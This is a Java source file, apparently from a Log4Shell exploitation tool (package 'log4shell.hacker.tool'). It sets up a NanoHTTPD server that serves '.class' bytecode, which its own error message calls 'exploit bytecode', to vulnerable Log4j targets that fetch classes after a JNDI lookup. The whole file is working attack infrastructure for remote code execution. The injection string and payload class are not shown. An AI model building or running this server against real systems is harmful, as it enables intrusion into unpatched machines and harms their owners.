package log4shell.hacker.tool;

import fi.iki.elonen.NanoHTTPD;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

import static fi.iki.elonen.NanoHTTPD.Response.Status.OK;

public class HttpServerSetup {
    private static final Logger log = LogManager.getLogger(HttpServerSetup.class);

    private final HttpServer serv;

    public HttpServerSetup(int port) {
        log.debug("Configuring HTTP server.");
        serv = new HttpServer(port);
    }

    public void start(){
        try {
            serv.start(NanoHTTPD.SOCKET_READ_TIMEOUT, true);
            log.debug("HTTP server was started.");
        } catch (IOException e) {
            throw new Error("Failed to start HTTP server", e);
        }
    }

    public void stop(){
        serv.stop();
        log.debug("HTTP server was stopped.");
    }

    private static class HttpServer extends NanoHTTPD {
        private static final Logger log = LogManager.getLogger(HttpServer.class);

        public HttpServer(int port) {
            super(port);
        }

        @Override
        public Response serve(IHTTPSession session) {
            String uri = session.getUri();
            log.debug("Received HTTP request: {}", uri);

            if(!uri.endsWith(".class")){
                return super.serve(session);
            }

            byte[] bytecode = readBytecode(uri);
            if(bytecode == null){
                return super.serve(session);
            }

            return newFixedLengthResponse(OK, "application/java-byte-code", new ByteArrayInputStream(bytecode), bytecode.length);
        }

        private byte[] readBytecode(String classPath) {
            var bytecodeInput = HttpServerSetup.class.getResourceAsStream(classPath);
            if (bytecodeInput == null){
                log.debug("Class {} was not found.", classPath);
                return null;
            }

            try(bytecodeInput){
                var buffer = new ByteArrayOutputStream();
                int b;
                while ( (b = bytecodeInput.read()) >= 0){
                    buffer.write(b);
                }

                log.debug("Bytecode for {} was loaded.", classPath);
                return buffer.toByteArray();
            } catch (IOException e) {
                throw new Error("Failed to load exploit bytecode.");
            }
        }
    }
}
